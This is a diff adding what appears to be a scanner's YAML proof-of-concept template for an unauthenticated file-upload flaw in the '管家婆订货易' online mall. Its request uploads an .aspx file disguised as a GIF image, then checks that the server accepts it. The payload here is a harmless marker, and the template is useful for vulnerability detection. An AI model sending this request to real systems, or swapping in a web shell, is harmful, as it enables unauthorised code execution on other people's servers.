@@ -1,0 +1,29 @@
+id:
+
+info:
+  name: 管家婆订货易在线商城 UploadImgNoCheck 文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /api/Upload/UploadImgNoCheck?m_server_name=ShopUserImg
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+  data: |
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR
+    Content-Disposition: form-data; name="Filedata";filename="test23.aspx"
+    Content-Type: image/jpeg
+
+    GIF89a
+    123456
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+response1:
+  headers:
+  body: .aspx
+  code: 200
+requests2:
+response2:
